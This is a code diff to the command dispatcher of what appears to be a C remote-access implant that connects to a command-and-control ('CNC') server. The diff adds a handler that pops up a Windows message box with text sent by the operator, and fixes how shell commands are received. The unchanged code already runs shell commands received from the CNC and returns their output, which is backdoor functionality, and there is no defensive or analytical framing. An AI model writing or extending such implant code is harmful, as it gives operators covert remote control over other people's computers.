@@ -2,6 +2,7 @@
 #include "cnc.h"
 #include "echo.h"
 #include "shell.h"
+#include "msgbox.h"
 #include "logger.h"
 #include "commander.h"
 
@@ -16,19 +17,19 @@ void handle_echo()
     ret = recv_from_cnc(&cmd.text_len, sizeof(cmd.text_len));
     if (ret != sizeof(cmd.text_len))
     {
-        log_error("Received invalid echo text length.");
+        log_error("Received invalid text length.");
         return;
     }
     cmd.text = malloc(cmd.text_len + 1);
     if (!cmd.text)
     {
-        log_error("Failed to allocate memory for echo's text.");
+        log_error("Failed to allocate memory for the text.");
         return;
     }
     ret = recv_from_cnc(cmd.text, cmd.text_len);
     if (ret != cmd.text_len)
     {
-        log_error("Received invalid echo text.");
+        log_error("Received invalid text.");
         return;
     }
     cmd.text[cmd.text_len] = 0;
@@ -38,7 +39,7 @@ void handle_echo()
     free(cmd.text);
     if (ret != cmd.text_len)
     {
-        log_error("Failed to send echoed text to CNC.");
+        log_error("Failed to send text to CNC.");
         return;
     }
 }
@@ -54,20 +55,20 @@ void handle_shell()
     ret = recv_from_cnc(&cmd.cmd_len, sizeof(cmd.cmd_len));
     if (ret != sizeof(cmd.cmd_len))
     {
-        log_error("Received invalid shell command length.");
+        log_error("Received invalid command length.");
         return;
     }
     cmd.cmd = malloc(cmd.cmd_len + 1);
     if (!cmd.cmd)
     {
-        log_error("Failed to allocate memory for the shell command.");
+        log_error("Failed to allocate memory for the command.");
         return;
     }
-    ret = recv_from_cnc(cmd.cmd, cmd.cmd_len + 1);
+    ret = recv_from_cnc(cmd.cmd, cmd.cmd_len);
     cmd.cmd[cmd.cmd_len] = 0;
     if (ret != cmd.cmd_len)
     {
-        log_error("Received invalid shell command.");
+        log_error("Received invalid command.");
         return;
     }
     log_info("Command: \"%s\"", cmd.cmd);
@@ -82,6 +83,59 @@ void handle_shell()
             return;
         send_to_cnc(out, bytes_read);
     }
+}
+
+void handle_msgbox()
+{
+    int ret;
+    struct msgbox_cmd cmd;
+
+    log_info("Received MSGBOX command.");
+
+    ret = recv_from_cnc(&cmd.title_len, sizeof(cmd.title_len));
+    if (ret != sizeof(cmd.title_len))
+    {
+        log_error("Received invalid title length.");
+        return;
+    }
+    cmd.title = malloc(cmd.title_len + 1);
+    if (!cmd.title)
+    {
+        log_error("Failed to allocate memory for the title.");
+        return;
+    }
+    ret = recv_from_cnc(cmd.title, cmd.title_len);
+    cmd.title[cmd.title_len] = 0;
+    if (ret != cmd.title_len)
+    {
+        log_error("Received invalid title.");
+        return;
+    }
+
+    ret = recv_from_cnc(&cmd.text_len, sizeof(cmd.text_len));
+    if (ret != sizeof(cmd.text_len))
+    {
+        log_error("Received invalid text length.");
+        return;
+    }
+    cmd.text = malloc(cmd.text_len + 1);
+    if (!cmd.text)
+    {
+        log_error("Failed to allocate memory for the text.");
+        return;
+    }
+    ret = recv_from_cnc(cmd.text, cmd.text_len);
+    cmd.text[cmd.text_len] = 0;
+    if (ret != cmd.text_len)
+    {
+        log_error("Received invalid text.");
+        return;
+    }
+
+    log_info("Title: \"%s\", Text: \"%s\"", cmd.title, cmd.text);
+    MessageBox(NULL, cmd.text, cmd.title, MB_OK);
+    free(cmd.title);
+    free(cmd.text);
 }
 
 void listen_for_cmds()
@@ -105,6 +159,9 @@ void listen_for_cmds()
             break;
         case SHELL_CMD_TYPE:
             handle_shell();
+            break;
+        case MSGBOX_CMD_TYPE:
+            handle_msgbox();
             break;
         }
     }
